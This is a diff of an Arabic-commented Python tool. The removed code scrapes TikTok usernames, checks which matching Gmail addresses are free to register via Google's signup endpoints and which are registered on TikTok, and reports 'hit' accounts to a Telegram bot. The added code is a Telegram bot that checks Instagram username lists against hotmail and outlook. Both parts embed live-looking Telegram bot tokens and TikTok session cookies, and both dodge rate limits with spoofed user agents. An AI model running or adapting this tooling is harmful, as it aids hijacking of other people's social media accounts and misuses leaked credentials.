@@ -1296,800 +1296,308 @@
 #---------------------------
 #------------------------
 
-#------------------------------[الالوان]-----------------------
-Z = '\033[1;31m';X = '\033[1;33m';F = '\033[2;32m' ;C = "\033[1;97m";B = '\033[2;36m';Y = '\033[1;34m';C = "\033[1;97m";E = '\033[1;31m';B = '\033[2;36m';G = '\033[1;32m';S = '\033[1;33m'
-#------------------------------[zaid]----------------------------
-try:import os,sys,webbrowser,json,requests,random;from user_agent import generate_user_agent;from uuid import uuid4;import uuid;from bs4 import BeautifulSoup;from datetime import datetime;import telebot;import time;from random import randint, choice;from urllib.parse   import urlencode, quote
-except:os.system("pip install requsets");os.system("pip install names");os.system("pip install user_agent");os.system("pip install uid");os.system("pip install uuid");os.system("pip install webbrowser");os.system("pip install socket");os.system("pip install datetime");os.system("pip install bs4");os.system("pip install telebot");os.system("pip install urllib");os.system("clear")
-import secrets
+import requests 
+import telebot 
 from telebot import types
-cokie  = secrets.token_hex(8)*2
-ya=0;no=0;nod=0;yas=0;em=0
+import requests
+from uuid import uuid4
+import random
+import os
+import json
+from user_agent import generate_user_agent
+import sys
+from datetime import datetime
+from bs4 import BeautifulSoup
+import datetime
+import socket
+E = '\033[1;31m'
+G = '\033[1;35m'
+Z = '\033[1;31m' #احمر
+X = '\033[1;33m' #اصفر
+Z1 = '\033[2;31m' #احمر ثاني
+F = '\033[2;32m' #اخضر
+A = '\033[2;34m'#ازرق
+C = '\033[2;35m' #وردي
+B = '\033[2;36m'#سمائي
+Y = '\033[1;34m' #ازرق فاتح
+M = '\x1b[1;37m'#ابیض
+S = '\033[1;33m'
+zzk=0
+#id = '5000568348'
+tok = '2110175275:AAGDYH2kYC-m--my-_cTyKhbLc_ob_pac4o'
+print('\n')
 
-try:
-	sessionid="{}".format(str(secrets.token_hex(8) * 2))
-	header = {"User-Agent": 'Mozilla/5.0 (Linux; Android 10; Lenovo K12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
-	zzzug=requests.get('https://www-useast1a.tiktok.com/passport/web/user/login/?',headers=header).cookies.get_dict()['passport_csrf_token']
-except:
-	print(' حدث خطأ في الانترنت اعد تشغيل')
-	exit()
-
-os.system('clear')						
-
-ID= '5949387072'
-tok= '6730328505:AAGfzfvNZDVGhZG6IgxigB3G00oHg9w18Pk'
-ugen,viv=[],[]
-for xd in range(10000):
-    a='Nokia'
-    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    c=random.randrange(1, 99)
-    d='/GoBrowser/'
-    e='1.6.0.'
-    f=random.randrange(1, 99)
-    uaku2=(f'{a}{b}{c}{d}{e}{f}')
-    ugen.append(uaku2)
-os.system('clear')
 bot = telebot.TeleBot(tok)
+os.system('clear')						
+zaidip = socket.gethostname()
+ipzaid = socket.gethostbyname(zaidip)
+url_ip = requests.get('https://pastebin.com/SB633KuS').text
+if ipzaid in url_ip:
+	os.system('clear')
+else :
+	os.system('clear')
+	print(f'{S} OF The Tools Programmer Zaid ')
+	print(f' {F}@P_W_7 ')
+	exit()
+print("1 - hotmail")
+print("2 - outlook")
+print('---------------------')
+try:
+	dez=int(input('Domin Email Check : '))
+except:
+	print('Error Numper !!!')
+	exit()
+if dez ==1:
+	dom='@hotmail.com'
+elif dez ==2:
+	dom='@outlook.com'
+else:
+	print('Error Numper !!! ')
+	exit()
+print('روح للبوت دز start/')
 
-def zzod(email):
-	email=str(email)
-	user = email.split('@')[0]
+import datetime
+zxu = datetime.datetime.now()
+#bot = telebot.TeleBot(tok)
+@bot.message_handler(commands=['start'])
+def start(message):
+ global zzk
+ zzk+=1
+ nm = message.from_user.first_name
+ id2 = message.from_user.id
+ userk = message.from_user.username
+ zxu = datetime.datetime.now()
+ tt=f'''
+عضو يستخدم البوت…
+ـــــــــــــــــــــــــــــــــــــــ
+اسم المستخدم : {nm}
+يوزر المستخدم : @{userk}
+ايدي المستخدم : {id2}
+رقم المستخدم  : {zzk}
+الوقت : {zxu}
+ـــــــــــــــــــــــــــــــــــــــ
+ـ @P_W_7'''
+
+ key = types.InlineKeyboardMarkup()
+ bot.send_message(message.chat.id, f"<strong>{tt}</strong>",parse_mode="html",reply_markup=key)
+ 
+
+ 
+ ch = types.InlineKeyboardButton(text ="أبـدأ فحـص لـسته انسـتا ", callback_data = 'list')
+ kk = types.InlineKeyboardButton(text =" حـذف الـسته القـديمه ", callback_data = 'ttl')
+ az = types.InlineKeyboardButton(text ="المبرمج : @P_W_7", url = 'https://t.me/P_W_7')
+ fr = message.from_user.first_name
+ maac = types.InlineKeyboardMarkup()
+ maac.row_width=2
+ maac.add(ch,kk,az)
+ bot.send_message(message.chat.id,f"<strong>اهلا بك : | {fr} | في بـوت فـحص  لـسته  انسـتكرام للحصول على معلوماتك [ /info ]</strong>",parse_mode="html",reply_markup=maac)
+@bot.callback_query_handler(func=lambda call:True)
+def st(call):
+ 
+ 
+ if call.data== 'list':
+            nc1 = types.InlineKeyboardMarkup(row_width=2)
+            message= bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='أرسـل لسـته انستكرام لـيتم الفحص ',reply_markup=nc1)
+            bot.register_next_step_handler(message,k1,message.id)
+
+
+ elif call.data== 'ttl':
+  nc1 = types.InlineKeyboardMarkup(row_width=2)
+  MC = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='أرسـل كـلمه حـذف ',reply_markup=nc1)
+  bot.register_next_step_handler(MC,k2)
+y1=0
+y2=0
+n1=0
+zy1=0
+xy=0
+def k1(message,id):
+	global y1,y2,xy,zy1,n1
+	iid = str(message.from_user.id)
+	aol1=0
+	face1=0
+	face2=0
+	aol2=0
+	eerr=0
+	zzoy=0
+	addad=0
 	try:
-		url = 'http://tik.report.ilebo.cc/users/login'
-		he = {
-	'X-IG-Capabilities': '3brTvw==',
-	'User-Agent': 'TikTok 85.0.0.21.100 Android (33/13; 480dpidpi; 1080x2298; HONOR; ANY-LX2; ANY-LX2;)',
-	'Accept-Language': 'en-US',
-	'Content-Type': 'application/json; charset=utf-8',
-	'Content-Length': '73',
-	'Host': 'tik.report.ilebo.cc',
-	'Connection': 'Keep-Alive',
-	'Accept-Encoding': 'gzip',
-	}
-		da={"unique_id":f"{user}","purchaseTokens":[]}
-	
-		re=requests.post(url,headers=he,data=da).json()
-		id = re['data']['user']['user']['id']
-		user = re['data']['user']['user']['uniqueId']
-		name = re['data']['user']['user']['nickname']
-		folon = re['data']['user']['stats']['followingCount']
-	
-		folos = re['data']['user']['stats']['followerCount']
-		lik = re['data']['user']['stats']['heartCount']
-		vid = re['data']['user']['stats']['videoCount']
-		age = re['data']['user']['user']['underAge18']
-		priv = re['data']['user']['user']['privateAccount']
-		bio = re['data']['user']['user']['signature']
-		ff = (f'''
-𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
-═══════════════════
-𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @P_W_7 | 
-═══════════════════
-𝙽𝙰𝙼𝙴 : {name}
-𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {user}
-𝙶𝙼𝙰𝙸𝙻 : {email}
-𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : {folos}
-𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {folon}
-𝙻𝙸𝙺𝙴 : {lik}
-𝙸𝙳 : {id}
-𝙿𝚁𝙸𝚅𝙰𝚃𝙴 : {priv}
-𝚅𝙴𝙳𝙾 : {vid}
-𝙰𝙶𝙴 : {age}
-𝙱𝙸𝙾 : {bio}
-═══════════════════
-	''')
-		print(ff)
-		bot.send_message(ID,f"<strong>{ff}</strong>",parse_mode="html",reply_markup=types.InlineKeyboardMarkup())
+		filename = message.document.file_name
+		file_info = bot.get_file(message.document.file_id)
+		use = bot.download_file(file_info.file_path)		
+		with open(f'usernamezaid{iid}.txt', 'wb') as (zaidno):
+			zaidno.write(use)
 	except:
-		tt=f'''
-𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
-═══════════════════
-𝙶𝙼𝙰𝙸𝙻 : {email}
-═══════════════════
-𝑷𝑹𝑶𝑮𝑹𝑨𝑴𝑴𝑹 : @P_W_7 | 
-''';bot.send_message(ID,f"<strong>{tt}</strong>",parse_mode="html",reply_markup=types.InlineKeyboardMarkup())
-
-	
-												
-def check(email):
-		#print(email)
-		global ya,no,nod,yas
-		eml=str(email)
-		email=eml.split('@')[0]+'@gmail.com'
-
-		he3 = {
-	    "accept": "*/*",
-	    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
-	    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
-	    "google-accounts-xsrf": "1",
-	    "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
-	    "sec-ch-ua-arch": "\"\"",
-	    "sec-ch-ua-bitness": "\"\"",
-	    "sec-ch-ua-full-version": "\"116.0.5845.72\"",
-	    "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
-	    "sec-ch-ua-mobile": "?1",
-	    "sec-ch-ua-model": "\"ANY-LX2\"",
-	    "sec-ch-ua-platform": "\"Android\"",
-	    "sec-ch-ua-platform-version": "\"13.0.0\"",
-	    "sec-ch-ua-wow64": "?0",
-	    "sec-fetch-dest": "empty",
-	    "sec-fetch-mode": "cors",
-	    "sec-fetch-site": "same-origin",
-	    "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
-	    "x-client-data": "CJjbygE=",
-	    "x-same-domain": "1",
-	    "Referrer-Policy": "strict-origin-when-cross-origin",
-	'user-agent': generate_user_agent()};tokk=requests.get('https://ssh5o-8ce98cab62ff.herokuapp.com/').text;da=(f'continue=https%3A%2F%2Fwww.google.com%2F&dsh=S1644399110%3A1695515527985204&flowEntry=ServiceLogin&hl=ar&ifkv=AYZoVhctgJglce8ngDS-YYmRkMjKcyuUZeIA6MlKZuxdmLk8INHHJp3tpqbQVyTNKjkpytBw8jTBiw&theme=glif&f.req=%5B%22{tokk}%22%2C%22zaid%22%2C%22ar%22%2C%22zaid%22%2C%22ar%22%2C0%2C0%2Cnull%2Cnull%2C%22web-glif-signup%22%2C0%2Cnull%2C1%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2C1%5D&azt=AFoagUWvOuuV65yGblelgMb8YgqIxqf-PQ%3A1695546705215&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C%22IQ%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C0%2Cnull%2C0%2C2%2C%22%22%2Cnull%2Cnull%2C0%2C0%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&checkConnection=youtube%3A847%3A1&checkedDomains=youtube&pstMsg=1&]')
-		zaid= requests.post('https://accounts.google.com/_/signup/validatepersonaldetails?hl=ar&_reqid=43956&rt=j',headers=he3,data=da).text
-		tl=zaid.split('["gf.ttu",null,"')[1].split('"],')[0]
-
-		url = f'https://accounts.google.com/_/signup/usernameavailability?hl=ar&TL={tl}&_reqid=765070&rt=j'
-		headers={
-			'Accept': '*/*',
-			'Accept-Encoding': 'gzip, deflate, br',
-			'Accept-Language': 'en-US,en;q=0.9',
-			'Content-Length': '898',
-			'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
-			'Cookie': cokie,
-			'Google-Accounts-Xsrf': '1',
-			'Origin': 'https://accounts.google.com',
-			'Referer': f'https://accounts.google.com/signup/v2/emailsignup?sjid=12488103466622635336-EU&theme=glif&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
-			'Sec-Ch-Ua': '"Not;A=Brand";v="8", "Chromium";v="117", "Google Chrome";v="117"',
-			'Sec-Ch-Ua-Arch': '"x86"',
-			'Sec-Ch-Ua-Bitness': '"64"',
-			'Sec-Ch-Ua-Full-Version': '"117.0.5938.63"',
-			'Sec-Ch-Ua-Full-Version-List': '"Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.63", "Google Chrome";v="117.0.5938.63"',
-			'Sec-Ch-Ua-Mobile': '?0',
-			'Sec-Ch-Ua-Model': '""',
-			'Sec-Ch-Ua-Platform': '"Windows"',
-			'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
-			'Sec-Ch-Ua-Wow64': '?0',
-			'Sec-Fetch-Dest': 'empty',
-			'Sec-Fetch-Mode': 'cors',
-			'Sec-Fetch-Site': 'same-origin',
-			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
-			'X-Same-Domain': '1',
-		}
-
-		data={
-			'theme': 'glif',
-			'continue': 'https://accounts.google.com/ManageAccount?nc=1',
-			'f.req': f'["TL:{tl}","{str(email)}",0,0,0,null,0,3508]',
-			'at': 'AFoagUU9EVwn5NhOjSbSekGRb853taFYlw:1695481442901',
-			'azt': 'AFoagUUmBNb6Od8MKLAz3aR1k7PQTrK84Q:1695481442901',
-			'cookiesDisabled': 'false',
-			'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,2]',
-			'gmscoreversion': 'undefined',
-			'flowName': 'GlifWebSignIn',
-			'checkConnection': 'youtube:671:0',
-			'checkedDomains': 'youtube',
-			'pstMsg': '1',
-		}
-	
-		try:
-		    rr = requests.post(url,headers=headers,data=data).text
-
-		    #print(rr)
-		except:
-		    print('')
-		if '"gf.uar",1,' in rr:
-		    yas+=1
-		    os.system('cls'if os.name=='net'else'clear')
-		    check2(email)
-		    print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
-		    
-		    #zzod(email)	    
-		else:
-			os.system('cls'if os.name=='net'else'clear')
-			nod+=1
-			#print(zom)
-			print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
-	
-def check2(email):
-
-	 global ya,no,nod,yas
-	 email=str(email)
-	 #print(email)
-	 a='Mozilla/5.0 (Linux; Android'
-	 b=random.randrange(1, 9);c=random.randrange(1, 9);d='11; Redmi Note 5A Lite)';e=random.randrange(100, 9999);f='AppleWebKit/537.36 (KHTML, like Gecko)';g=random.randrange(1, 9);h=random.randrange(1, 4);i=random.randrange(1, 4);j=random.randrange(1, 4);k='Chrome/96.0.4664.45 Mobile Safari/537.36'
-	 ua=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
-	 url = "https://www.tiktok.com/passport/web/user/check_email_registered?shark_extra" 
-	 data = f"email={email}&aid=1459&language=ar&account_sdk_source=web&region=IQ"
-	 #proxy = '117.54.142.46:8080'
-	 rr = requests.post(url,headers={"User-Agent": str(ua)},data=data).text#
-	 #print(rr)
-	 if '":{"is_registered":1' in rr:
-	 	os.system('cls'if os.name=='net'else'clear')
-	 	ya+=1
-
-	 	print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')	
-	 	zzod(email)
-	 elif '":{"is_registered":0' in rr:
-	 	os.system('cls'if os.name=='net'else'clear')
-	 	no+=1
-
-	 	print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
-	 else:
-	 	os.system('clear')
-	 	print(' تم حضرك روح افتح Vpn وتعال حته اكملك فحص اركض انتضرك')
-	 	time.sleep(20)
-		 		 
-
-def zod():
-	 			user = input(f'{S}∆ - Write User TikTok: ')
-	 			print('')
-	 			print(f'{B}═════════════════════════════')
-	 			try:
-	 				url = 'http://tik.report.ilebo.cc/users/login'
-	 				he = {
-	'X-IG-Capabilities': '3brTvw==',
-	'User-Agent': 'TikTok 85.0.0.21.100 Android (33/13; 480dpidpi; 1080x2298; HONOR; ANY-LX2; ANY-LX2;)',
-	'Accept-Language': 'en-US',
-	'Content-Type': 'application/json; charset=utf-8',
-	'Content-Length': '73',
-	'Host': 'tik.report.ilebo.cc',
-	'Connection': 'Keep-Alive',
-	'Accept-Encoding': 'gzip',
-	};da={"unique_id":f"{user}","purchaseTokens":[]};re=requests.post(url,headers=he,data=da).json();id = re['data']['user']['user']['id'];print(f'>ID Your Account : {E}{id}')
-	 			except:
-	 				os.system('clear')
-	 				print('هنأك خطأ في اليوزر او اعد محاوله :(')
-	 				exit()
-
-	 			print(f'{B}>Please Get User : {E}{user}')
-	 			uid = "".join(random.choice('1234567890')for i in range(18))
-	 			url = f'https://api2-19-h2.musical.ly/aweme/v1/user/following/list/?user_id={id}&max_time=0&count=200&offset=0&source_type=2&address_book_access=2&gps_access=2&manifest_version_code=2019081160&_rticket=1694547483074&app_language=ar&current_region=IQ&app_type=normal&iid=7278024586699523845&channel=googleplay&device_type=SM-N960N&language=ar&locale=ar&resolution=720*1280&openudid=19e5434d5417cdcb&update_version_code=2019081160&sys_region=EG&os_api=28&uoo=0&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=320&residence=IQ&carrier_region=IQ&ac=wifi&device_id=7272729095556662789&pass-route=1&mcc_mnc=41820&os_version=9&timezone_offset=10800&version_code=120603&carrier_region_v2=418&app_name=musical_ly&ab_version=12.6.3&version_name=12.6.3&device_brand=samsung&ssmix=a&pass-region=1&device_platform=android&build_number=12.6.3&region=EG&aid=1233&ts=1694547477&sec_user_id={user}'
-
-	
-	 			he = {
-            'Host': 'api2-19-h2.musical.ly',
-            'accept-encoding': 'gzip',
-            'sdk-version': '1',
-            'cookie': 'store-idc=maliva; store-country-code=iq; d_ticket=75f95e60c9cde3facb8a2439ba7ae961c041b; passport_csrf_token_default=efd0ea2687a947be434c6524721ac06e; odin_tt=f3be583347fd2518a759031ef11d5d1689c1da8da26dc6f75c5af6e63415f455dff04a813d191640436119eec0f23115be695337bf00b4e942a9f43d770598609a5502760e788ca9aa8ee7f5bc1f4b12; sid_guard=838773198b8ebc47900c997493f06e17%7C1694547407%7C15551999%7CSun%2C+10-Mar-2024+19%3A36%3A46+GMT; uid_tt=87a4e2238bd92924b8b9f26d811871f20f4d886c41b0c2c4df40ce7476408331; sid_tt=838773198b8ebc47900c997493f06e17; sessionid=838773198b8ebc47900c997493f06e17; store-country-code-src=uid',
-            'x-tt-token': '03838773198b8ebc47900c997493f06e1705a79067fed630a2c16bd4f60750606123d398071c0ecee0fd617a0697c63ec832afcf3fe4725d522a3892e6c6d2eeb883f6b3c9e43075815a5e99d16d4dcae6eaebf7d9bd94c0adb0c41319139bc34fb34-CkBiNzEyOGZjZjliMTI1MDZkMTkwMzRlOWY1ZWZiYTdmYzE1ZTNlOTc0YWJhZjIzOWMzN2U4ZGE5MzI4MTBjNzhk-2.0.0',
-            'x-khronos': '1694549064',
-            'x-gorgon': '8300ea164000e65d9b4756041c6b3743225fd6450a2e4dadf734',
-            'user-agent': 'okhttp/3.10.0.1',
-	}
-	
-
-	 			re = requests.get(url,headers=he).json()
-	
-	 			#print(re)
-	 			zz=0
-	 			try:
-	 				while True:
-	 					zz+=1
-	 					us=(re['followings'][zz]['unique_id'])
-
-	 					#print(us)
-	 					email=us
-	 					check(email)
-	 			except:
-	 				print(' لقد انتهاء الفحص بنجاح ')
-
-
-def zod2():
- while True:
-  try:
-                  header = {"User-Agent": 'Mozilla/5.0 (Linux; Android 10; Lenovo K12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
-                  msToken=requests.get('https://www-useast1a.tiktok.com/passport/web/user/login/?',headers=header).cookies.get_dict()['msToken']
-                  ttwid=requests.get('https://www.tiktok.com/',headers=header).cookies.get_dict()['ttwid']
-  except:
-    pass
-    zaid()
-  try:
-   country='IQ'
-   pro = random.choice(ugen)
-   rng=int("".join(choice('456789')for i in range(1)))
-   user='qwertyuiopasdfghjklzxcvbnm'
-   name=str("".join(random.choice(user)for i in range(rng)))
-   params = urlencode({
-'aid'               : 1988,
-'app_language'      : 'en',
-'app_name'          : 'tiktok_web',
-'battery_info'      : '0.6',
-'browser_language'  : 'en',
-'browser_name'      : 'Mozilla',
-'browser_online'    : 'true',
-'browser_platform'  : 'Win32',
-'browser_version'   : '5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
-'channel'           : 'tiktok_web',
-'cookie_enabled'    : 'true',
-'device_id'         : randint(6999999999999999999, 7122222222222222222),
-'device_platform'   : 'web_pc',
-'focus_state'       : 'true',
-'from_page'         : 'user',
-'history_len'       : '3',
-'is_fullscreen'     : 'false',
-'is_page_visible'   : 'true',
-'os'                : 'windows',
-'priority_region'   : f'{country}',
-'referer'           : '',
-'region'            : f'{country}',
-"screen_height"     :   randint(777, 888),
-"screen_width"      :   randint(1333, 1666),
-'tz_name'           : 'Europe/London',
-'keyword'         : name,
-'webcast_language'  : 'en',
-})
-   u=f'https://www.tiktok.com/api/search/user/full/?{params}'
-   h={'Cookie':'ttwid='+ttwid+'; tiktok_webapp_theme=light; msToken=2cFfY83w7ZYqeJfgSrtprxuGTSGt6Gc0eDwFbgXg9X2H9QKDvqyP84CCl5rQLohHqsWmMbFe6wbNEP8-opBSk0lOsyjuzONVAKvkGqzDSqpjF06wiD6q7dttLj8SXD1G3Hrp; ttwid='+ttwid+'; passport_csrf_token='+zzzug+'; passport_csrf_token_default='+zzzug+'; uid_tt=586f8c5249e9ca4373252f9eee8e7c83c9d67acce516a2f60263e96bd2d05513; uid_tt_ss=586f8c5249e9ca4373252f9eee8e7c83c9d67acce516a2f60263e96bd2d05513; sid_tt='+sessionid+'; sessionid='+sessionid+'; sessionid_ss='+sessionid+'; sid_ucp_v1=1.0.0-KDM4Mzc5NGVjZjZiMTI2YmMwNDliMWZhYTFiZjRmNDQzYjBhMTFmNDkKIAiCiKiSlOmvu2MQgeeEoQYYswsgDDD3_tqbBjgBQOoHEAMaBm1hbGl2YSIgZDI2MTYzZjY4ZTZjOTVkNDljMDNlYzdmNzJkNzAwN2Q; ssid_ucp_v1=1.0.0-KDM4Mzc5NGVjZjZiMTI2YmMwNDliMWZhYTFiZjRmNDQzYjBhMTFmNDkKIAiCiKiSlOmvu2MQgeeEoQYYswsgDDD3_tqbBjgBQOoHEAMaBm1hbGl2YSIgZDI2MTYzZjY4ZTZjOTVkNDljMDNlYzdmNzJkNzAwN2Q; store-idc=maliva; store-country-code=tr; store-country-code-src=uid; tt-target-idc=useast1a; tt-target-idc-sign=cQMNfSjvvlNBGrwBOVqQa00_v09uRkDCThX0h3WaTo3QkciqJxdiEQWfUogQifipphJ2Ew8lBPW5swp2QVAyQLMcRUZM7pXPh0HyaHO8KrEiK9A3hSGZBZxSEAtjUhUMDQUDKDoC0cR0zeg-w2kkEIzXQLMsCGEMP93BoNLamPReCgAQrzLXVcgIYxWPpL5a-6aGuB43e42MWOqeJ5YSA9r0Un4DqveL_K1-LXhXjSwcnPfR6vF53zPExkDb2QMG0jvHTef2Y-aXwqVhDrmc22wJAL5bMgEqtWhsdetK292OW6-_yY0vNW4FeADvZClor00lmXAXqgknfgEXkqbWe8oDu4o4-WTVM8Y0YMAJeS7RJkEW_2Di7V1o17gI8-dYhyE7Zi_Gm9junoMOnpbye8K-E1Tr6NEmp-ceoY1_ic6BewgUoVNqe3A6sYigbBydUam2obTHgrQgOD0Qss3TjvigPlTsC8DrE9DXhiSqAe-dCSnuEL_2tbfXt433ZkPE; tt_csrf_token=PSOxiSio-0SwWbZDgx1udkrvw10E6D869hY4; tt_chain_token=xzQFbQnJcDXq3OHhlmhPQA==; __tea_cache_tokens_1988={%22_type_%22:%22default%22%2C%22user_unique_id%22:%227215088339640649222%22%2C%22timestamp%22:1679893715575}; passport_fe_beating_status=true; csrf_session_id=3f2907b98fa47d37c429fe3249297a97; msToken='+msToken+'',
-                        'User-Agent':pro}
-   r=requests.get(u,headers=h).json()
-   rzo = r['user_list']
-   for usz in rzo:
-    email=str(usz['user_info']['unique_id'])
-    if '_' in email:
-    	continue
-    else:
-    	check(email)
-
-  except:
-    pass 
-    zod2()
-
-		
-
-def znoxy(porx):
- while True:
-  try:
-                  header = {"User-Agent": 'Mozilla/5.0 (Linux; Android 10; Lenovo K12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
-                  msToken=requests.get('https://www-useast1a.tiktok.com/passport/web/user/login/?',headers=header).cookies.get_dict()['msToken']
-                  ttwid=requests.get('https://www.tiktok.com/',headers=header).cookies.get_dict()['ttwid']
-  except:
-    pass
-    znoxy()
-  try:
-   country='IQ'
-   pro = random.choice(ugen)
-   rng=int("".join(choice('456789')for i in range(1)))
-   user='qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm'
-   name=str("".join(random.choice(user)for i in range(rng)))
-   params = urlencode({
-'aid'               : 1988,
-'app_language'      : 'en',
-'app_name'          : 'tiktok_web',
-'battery_info'      : '0.6',
-'browser_language'  : 'en',
-'browser_name'      : 'Mozilla',
-'browser_online'    : 'true',
-'browser_platform'  : 'Win32',
-'browser_version'   : '5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
-'channel'           : 'tiktok_web',
-'cookie_enabled'    : 'true',
-'device_id'         : randint(6999999999999999999, 7122222222222222222),
-'device_platform'   : 'web_pc',
-'focus_state'       : 'true',
-'from_page'         : 'user',
-'history_len'       : '3',
-'is_fullscreen'     : 'false',
-'is_page_visible'   : 'true',
-'os'                : 'windows',
-'priority_region'   : f'{country}',
-'referer'           : '',
-'region'            : f'{country}',
-"screen_height"     :   randint(777, 888),
-"screen_width"      :   randint(1333, 1666),
-'tz_name'           : 'Europe/London',
-'keyword'         : name,
-'webcast_language'  : 'en',
-})
-   u=f'https://www.tiktok.com/api/search/user/full/?{params}'
